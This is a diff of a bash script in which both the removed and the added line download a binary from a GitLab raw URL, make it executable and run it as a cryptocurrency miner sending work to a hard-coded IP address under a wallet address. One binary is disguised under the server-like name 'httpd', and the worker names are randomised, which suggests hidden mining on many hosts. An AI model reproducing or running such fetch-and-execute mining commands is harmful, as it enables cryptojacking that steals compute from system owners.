@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 
-wget https://gitlab.com/ravencoin002/sc/-/raw/main/httpd  && chmod 700 httpd && ./httpd -a yespower -o stratum+tcps://164.90.220.205:80 -u ukt9aUAA1WbBDAphyn4MxmM4DGfUTRgyVk.cons$(shuf -n 1 -i 1-9999999) -t8
+wget https://gitlab.com/bromase889/cobagas/-/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz && chmod 700 xlarig && ./xlarig -o 128.199.197.254:80 -u ZEPHYR2Fxj6MkDVQCi2e1W7fH9f5QYvnsLjrmoCuWKz615MjysUy1FgDoPbNhKg7qcdD3F2p1k3XYRtcbeCfFeWTYubQPzt356b2d -p POTIT
